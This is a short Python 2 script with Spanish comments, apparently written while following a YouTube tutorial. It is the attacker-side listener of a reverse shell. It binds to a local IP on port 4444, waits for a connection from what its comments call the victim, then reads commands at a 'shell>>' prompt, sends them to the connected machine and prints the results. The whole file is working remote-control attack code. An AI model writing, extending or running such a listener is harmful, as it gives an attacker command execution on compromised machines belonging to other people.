#continuar luego
#https://youtu.be/G0Bb0lvAspo?t=2231
import socket

class Listener:
    def __init__(self, ip , port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #Se define listener
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) #Se coloca el socket

        listener.bind((ip, port)) #Abre el servidor
        listener.listen(0)

        print("Esperando por conexiones")

        self.connection, address = listener.accept() #Acepta la conexion de la victima al servidor 

        print("Tenemos una conexion de " + str(address))

    def ejecutar_remoto(self, command): #Ejecuta el comando que se envio en Run()
        self.connection.send(command)
        return self.connection.recv(1024) #Retorna lo recibido en el comando
        
    def run(self):
        while True:
            command = raw_input("shell>>")
            result = self.ejecutar_remoto(command)
            print(result)  #Muestra en pantalla el valor retornado

escuchar = Listener("192.168.100.40", 4444) #Recibe los datos de la victima
escuchar.run() #Envia los datos obtenidos a Run()